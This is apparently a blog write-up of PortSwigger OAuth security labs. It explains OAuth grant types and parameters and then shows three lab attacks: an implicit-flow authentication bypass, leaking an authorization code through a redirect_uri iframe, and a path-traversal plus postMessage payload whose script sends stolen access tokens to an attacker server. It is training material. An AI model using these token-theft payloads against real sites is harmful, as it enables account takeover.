---
title: PortSwigger - OAuth Labs 
date: '2024-06-10'
tags: ['PortSwigger', 'PortSwigger Labs', 'Web Security']
draft: false
summary: 
---

## OAuth
Instead of manually entering PII data, the user can click on sign in with google and the website will request your PII from google on your behalf and use to sign you up.

Entites in OAuth :
- Client Application
- Resource Owner
- OAuth Service provider

There are different types of OAuth flows or grant types.
- Authorization code (`response_type=code`)
- implicit grant (`response_type=token`)

1. The client application requests access to a subset of the user's data, specifying which grant type they want to use and what kind of access they want.
2. The user is prompted to log in to the OAuth service and explicitly give their consent for the requested access.
3. The client application receives a unique access token that proves they have permission from the user to access the requested data. Exactly how this happens varies significantly depending on the grant type.
4. The client application uses this access token to make API calls fetching the relevant data from the resource server.

Following parameters are involved in an OAuth request :
- `client_secret` : A secret shared with the client when it registers itself with OAuth service
- `scope` : defines the scope of the data requested i.e., contact info, email address , msisdn
- `authorization code`: If user clicks on allow this app on google page, google gives this code to the application
- `access token` : The app then gives the authorization token to google and it gives the access_token
- The access token is then finally used in the API call to get the requested scope info
- `state`: unguessable value passed in the request
- `grant_type`: Type of OAuth flow being used
- `redirect_uri`: The uri which user browser will redirect to when sending authorization code to the client application

![[Pasted image 20240721130055.png]]

> OAuth can be used for Authentication as well, by using the same access token(give by OAuth service) on the client application


Check the OAuth provider being used the by the website, most of these providers have publicly available documentations.

---- 

# Labs

####  Lab: Authentication bypass via OAuth implicit flow

Simple authentication bypass in the below request we changed the username and email to `carlos` and the OAuth flow which lead to account takeover.

```
POST /authenticate HTTP/2
Host: 0a7800ed0329f210820b1f29000100ec.web-security-academy.net
Cookie: session=i62PrPxWR2pMrRjU5iOMH3gfdt4uxH9R
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a7800ed0329f210820b1f29000100ec.web-security-academy.net/oauth-callback
Content-Type: application/json
Content-Length: 103
Origin: https://0a7800ed0329f210820b1f29000100ec.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=4
Te: trailers

{"email":"wiener@hotdog.com","username":"wiener","token":"3xGux18fKGtaTDhpfUWIQghPbfjXwJHKywGlpcduSnT"}
```


##### Leaking authorization codes and access tokens

```
In this lab we observed that redirect_url parameter in OAuth could be used to submit any arbitary value without any issue. 


https://oauth-0ad000e0042feecab57ec0dc02fd0009.oauth-server.net/auth?client_id=zhbq6777jywbiwa3krxnk&redirect_uri=https://exploit-0a770084041bee20b566c1d601190087.exploit-server.net/exploit&response_type=code&scope=openid%20profile%20email


So we added the url of our exploit server to the link and sent this iframe to victim

<iframe src="https://oauth-0ad000e0042feecab57ec0dc02fd0009.oauth-server.net/auth?client_id=zhbq6777jywbiwa3krxnk&redirect_uri=https://exploit-0a770084041bee20b566c1d601190087.exploit-server.net&response_type=code&scope=openid%20profile%20email"></iframe>

Victim clicked on this iframe which lead to victim sharing their authorization token with us. We used this token to login to their account
```


#### Stealing OAuth access tokens via a proxy page
The goal here is to leak authorization token to an attacker controlled page or server.

First we identified a path traversal vulnerability in `redirect_uri` paramter
```http
https://oauth-0a3f00be03dddb7e804d790602a0002c.oauth-server.net/auth?client_id=r530xxhu0zxix98omzwqg&redirect_uri=https://0ac400e30362dbb380697baf00420095.web-security-academy.net/oauth-callback/../&response_type=token&nonce=1073277704&scope=openid%20profile%20email
```

We leverage this path traversal with a post message we found in the code. This postmessage allowed messages to be posted to any origin.

Final payload :

```javascript
<iframe src="https://oauth-0a3f00be03dddb7e804d790602a0002c.oauth-server.net/auth?client_id=r530xxhu0zxix98omzwqg&redirect_uri=https://0ac400e30362dbb380697baf00420095.web-security-academy.net/oauth-callback/../post/comment/comment-form&response_type=token&nonce=-1295109921&scope=openid%20profile%20email"></iframe>

<script>
	window.addEventListener('message',function(e){
		fetch("/"+encodeURIComponent(e.data.data))
	}, false)
</script>
```

This exploit is dilevered to victim which gives us the token.